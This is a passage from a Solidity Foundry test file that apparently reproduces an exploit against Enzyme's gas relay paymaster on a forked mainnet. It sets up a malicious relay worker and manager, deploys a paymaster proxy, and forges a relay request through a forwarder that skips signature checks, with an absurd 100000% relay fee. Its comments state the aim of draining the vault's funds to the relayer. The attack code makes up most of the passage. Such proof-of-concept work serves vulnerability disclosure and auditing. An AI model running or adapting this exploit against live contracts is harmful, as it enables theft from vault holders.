        mockAssetManager =  vm.addr(ASSETMANAGER_PRIVATE_KEY); // we have created a mock asset manager
        emit log_named_address("Mock Asset Manager Set to", mockAssetManager);

        //Next step is to link this vault owner to actual vault on mainnet
        _setupVault();
        mockComptroller.setVault(address(vault)); // setting vault address inside comptroller - this is for topping up paymaster if it falls short of funds        
        console.log("---------------STEP 5 COMPLETE---------------------");        
        console.log("--------------------------------------------------");

        // STEP 7 -> Setup Paymaster Beacon proxy
       console.log("****** STEP 6: Paymaster Beacon Proxy *********");                
        _setupPaymasterBeaconProxy(); // sets the paymaster -> sets canonical lib of beacon proxy to the GasPaymasterLib
        // this is the vulnerable implementation that we intend to exploit
        console.log("---------------STEP 6 COMPLETE---------------------");        
        console.log("--------------------------------------------------");

        // STEP 7 -> Fund 0.2 ETH to paymaster
        console.log("****** STEP 7: Fund paymaster & deposit into Relay Hub *********");        
       emit log_named_uint("Paymaster balance before funding", address(paymaster).balance);
        vm.deal(address(paymaster), 0.2 ether);        
        emit log_named_uint("Paymaster balance after funding", address(paymaster).balance);
        vm.prank(address(paymaster));
        relayHub.depositFor{value: address(paymaster).balance}(address(paymaster));
        
        console.log("---------------STEP 7 COMPLETE---------------------");        
        console.log("--------------------------------------------------");
        mockComptroller.setGasRelayPaymaster(address(paymaster)); // setss paymaster contract in mock comptroller
    }

    // test setup addys
    function testSetup() external{
        //chk 1. chekc if attacker is registered with a relay manager
        //chk 2. check that relay manager is staked 
        address relayManager = _getAddress("relayManager");
        assertTrue(relayHub.isRelayManagerStaked(relayManager));
        assertEq(relayHub.workerToManager(maliciousRelayWorker), relayManager);

        //chk 3. check balance of paymaster should be 0.2 eth
        assertEq(address(paymaster).balance, 0.2 ether);

        //chk 4. check if vault allows calls from the mock asset manager
        assertTrue(vault.canRelayCalls(mockAssetManager));

        //chk 5. checks if vault parent comptroller set to recipient
        assertEq(vault.getAccessor(), address(mockComptroller));
     }


    
    // tests beacon proxy setup for gas paymaster
    function testDeployPaymasterProxy() external {
        address beaconProxyFactoryOwner = IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).getOwner();

        vm.prank(address(beaconProxyFactoryOwner));
        IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).setCanonicalLib(PAYMASTER_LIB);

        address canonicalLibAfter =  IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).getCanonicalLib();
        assertTrue(canonicalLibAfter == PAYMASTER_LIB); // setting the implementation to paymaster lib 

        address vaultAddy = _getAddress("vaultAddy");
        address paymasterProxy =  IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).deployProxy(abi.encodeWithSignature("init(address)", vaultAddy));

        console.log("payment proxy addy", paymasterProxy);
        assertEq(IGasRelayPaymasterLib(paymasterProxy).getParentVault(), vaultAddy);               
    }

    // main attack -> objective is to drain the vault and pass all balance to gas relay paymaster
    // malicious forwarder accepts any message even if its not signed by original vault owner
    // baseRelayFee and pctRelayFee can be increased to a high value by malicious gas relayer
    function testEnzymeAttack() external{
        assertTrue(mockComptroller.isTrustedForwarder(address(trustedForwarder)));
        
        console.log("****** STEP 0-6 COMPLETE *********"); 
        console.log("****** STEP 7: Create and sign a relay request *********");    


        uint256 gasPrice = 10;
        vm.txGasPrice(gasPrice); // Setting Gas Price = gas sent by the user

        uint256 gasNeeded = 50000; // estimated gas for running callOnExtension is 30000 gas -> just passing a bit extra

        IRelayHub.ForwardRequest memory fwdRequest = IRelayHub.ForwardRequest({
        from: mockAssetManager, // vault owner we are forging
        to: address(mockComptroller), // address on which the msg gets executed
        value: 0, // eth value sent = 0
        gas: gasNeeded, // expected gas for executing callOnExtension() is 23181 -> sending slightly more
        nonce: msgNonce, // incremented every time request is successful
        data: abi.encodeWithSignature("callOnExtension(address,uint256,bytes)", address(0), 0, ""), // function to execute on MockComptroller
        validUntil: block.timestamp + 100 // deadline
        });
        
        IRelayHub.RelayData memory relayData = IRelayHub.RelayData({
        gasPrice: gasPrice,// set tx gas price = this gas
        pctRelayFee: 100000, //100000% fee to be refunded to relay worker, a ridiculously high value
        baseRelayFee: 0, // setting this to 0 for now - this can also be increased to demonstrate this attack
        relayWorker: maliciousRelayWorker, // relay worker is one who calls relayCall on relayHub
        paymaster: address(paymaster),
        forwarder: address(maliciousForwarder), // forwarder is a malicious forwarder that skips verification
        paymasterData: abi.encode(true),
        clientId: 0
        });

        IRelayHub.RelayRequest memory relayRequest = IRelayHub.RelayRequest({
            request: fwdRequest,
            relayData: relayData
        });
        uint256 gasInput = 500000;  // using this just to avoid out-of-gas -> point of this attack is not to gas optimize
        IGasRelayPaymasterLib.GasAndDataLimits memory gasLimit = paymaster.getGasAndDataLimits();
        uint256 maxAcceptanceBudget = gasLimit.acceptanceBudget;
        uint256 externalGasLimit = gasInput * 105 / 100; // external gas limit is slightly higher
        
        EIP712Signature eip712Helper = new EIP712Signature();
        (, bytes memory sign) = eip712Helper.signRelayRequest(RELAYWORKER_PRIVATE_KEY, address(maliciousForwarder), relayRequest);

        uint256 prevCtr = mockComptroller.getCounter();
        console.log("prev counter", prevCtr);

        // We have everything ready -> prank as relay worker
        // and send the relay request 
        vm.prank(address(maliciousRelayWorker), address(maliciousRelayWorker)); //setting tx.origin == msg.sender -> expects an EOA to initiate 
        (bool payMasterAccepted, ) = relayHub.relayCall{gas: gasInput}(maxAcceptanceBudget, relayRequest, sign, bytes(""), externalGasLimit);
        if(payMasterAccepted) msgNonce ++;
        assertTrue(payMasterAccepted);
        console.log("new counter", mockComptroller.getCounter());
        console.log("vault balance WETH after relay call", IWETH(WETH).balanceOf(address(vault))); // vault balance decreases from initial balance 10 ether
        console.log("balance assigned to relay manager", relayHub.balanceOf(_getAddress("relayManager"))); // note that relay managers balance has increased

        // // A successfull call should increase counter by 1
        assertEq(mockComptroller.getCounter(), prevCtr + 1);
    }


    //helper function to set up a relay manager for our current relay worker
    // also adding stakes to the relay manager
    function _setupRelayWorkerAndManager(address relayWorker, uint256 stake, uint unstakeDelay) private returns(address relayManager, address relayManagerOwner){
        relayManager = _getAddress("relayManager");
        relayManagerOwner = _getAddress("relayManagerOwner");
        vm.deal(relayManagerOwner, stake); // give eth to the stake manager        
        address[] memory relayWorkers = new address[](1);
        relayWorkers[0] = relayWorker;

        vm.startPrank(relayManager);
        stakeManager.setRelayManagerOwner(payable(relayManagerOwner)); // set relay manager owner
        emit log_named_address("Relay Manager owner set to", relayManagerOwner);
        stakeManager.authorizeHubByManager(address(relayHub)); // authorize relay hub
        emit log_named_address("Stake Manager authorizes relay hub address:", address(relayHub));
        vm.stopPrank();
        
        vm.prank(relayManagerOwner);
        stakeManager.stakeForRelayManager{value: stake}(relayManager, unstakeDelay); // stake value for relay manager
        emit log_named_uint("stake amount staked by relay manager owner", stake);
        emit log_named_address("relay manager staked", relayManager);

        vm.prank(relayManager);
        relayHub.addRelayWorkers(relayWorkers); // added relay worker to relay hub
        emit log_named_address("relay worker added to relay manager", relayWorker);
    }

    // helper function that changes vault settings to make following changes
    // allow the 'from' address (original request initiator) to relay calls
    // set the mock comptroller we created as the vault comptroller
    function _setupVault() private {
        vault = IVault(VAULT);
        address vaultOwner = vault.getOwner();
        address vaultCreator = vault.getCreator();
        address[] memory managers = new address[](1);
        managers[0] = mockAssetManager;

        vm.prank(vaultOwner);
        vault.addAssetManagers(managers); // added our mock asset manahger to vault
        emit log_named_address("Vault adds a new asset manager with address:", mockAssetManager);    
        vm.prank(vaultCreator);
        vault.setAccessor(address(mockComptroller)); // setting mock comptroller        
        emit log_named_address("Vault adds mock comptroller as accessor with address:", address(mockComptroller));            


        // last step, fund vault with 10 ether

        vm.deal(address(vault), 10 ether);
        emit log_named_uint("Vault balance ETH", address(vault).balance);        
        vm.prank(address(vault)); // prank and convert eth to weth
        IWETH(WETH).deposit{value:address(vault).balance}();
        emit log_named_uint("Vault weth balance", IWETH(WETH).balanceOf(address(vault)));
    }

   function _setupPaymasterBeaconProxy() private {

        address beaconProxyFactoryOwner = IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).getOwner();

        vm.prank(address(beaconProxyFactoryOwner));
        IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).setCanonicalLib(PAYMASTER_LIB);
        
        address canonicalLibAfter =  IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).getCanonicalLib();
        assertTrue(canonicalLibAfter == PAYMASTER_LIB); // setting the implementation to paymaster lib
        // this will be implementation for all the proxies created by the factor

        // Now deploy a beacon proxy -> this proxy now refers to implementation in BEACON
        // which is set in the previous setCanonicalLib step
        // address paymasterProxy =  IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).deployProxy(abi.encodeWithSignature("deposit()"));
        address paymasterProxy =  IGasRelayPaymasterFactory(PAYMASTER_BEACON_FACTORY).deployProxy(abi.encodeWithSignature("init(address)", address(vault)));

        paymaster = IGasRelayPaymasterLib(paymasterProxy); // instead of Paymaster Lib -> we are nmow setting
        console.log("paymaster proxy address", address(paymaster));
        assertEq(paymaster.getParentVault(), address(vault));
        // paymaster to its proxy contract that calls the lib implementation
        // note that this proxy address is randomly picked from the list of created proxies on etherscan 
        
    }


    function _getAddress(bytes memory name) private pure returns(address){
        return address(uint160(uint256(keccak256(name))));
    }

    function _getCodeSize(address target) private view returns(uint256){
            uint32 size;
        assembly {
            // Retrieve the size of the code at the target address
            size := extcodesize(target)
        }
        return size;
    }

   function mockRelayCall(
        uint256 maxAcceptanceBudget,
        IRelayHub.RelayRequest memory relayRequest,
        bytes memory signature,
        bytes memory approvalData,
        uint256 externalGasLimit
    ) external returns (bool paymasterAccepted, bytes memory returnValue){

        emit log_named_uint("message data length", msg.data.length);
        emit log_named_uint("signature length", signature.length);
        emit log_named_uint("approval Data length", approvalData.length);
        emit log_named_uint("relay paymaster data", relayRequest.relayData.paymasterData.length );
        emit log_named_uint("forward request data", relayRequest.request.data.length);
        emit log_named_uint("back calculated length", 4 + 22 * 32 + signature.length + approvalData.length + relayRequest.relayData.paymasterData.length +  relayRequest.request.data.length);
        paymasterAccepted = true;
        returnValue = "0x";
    }

        function __parseTxDataFunctionSelector(bytes memory _txData)
        private
        pure
        returns (bytes4 functionSelector_)
    {
        /// convert bytes[:4] to bytes4
        require(
            _txData.length >= 4,
            "__parseTxDataFunctionSelector: _txData is not a valid length"
        );

        functionSelector_ =
            _txData[0] |
            (bytes4(_txData[1]) >> 8) |
            (bytes4(_txData[2]) >> 16) |
            (bytes4(_txData[3]) >> 24);

        return functionSelector_;
    }
}



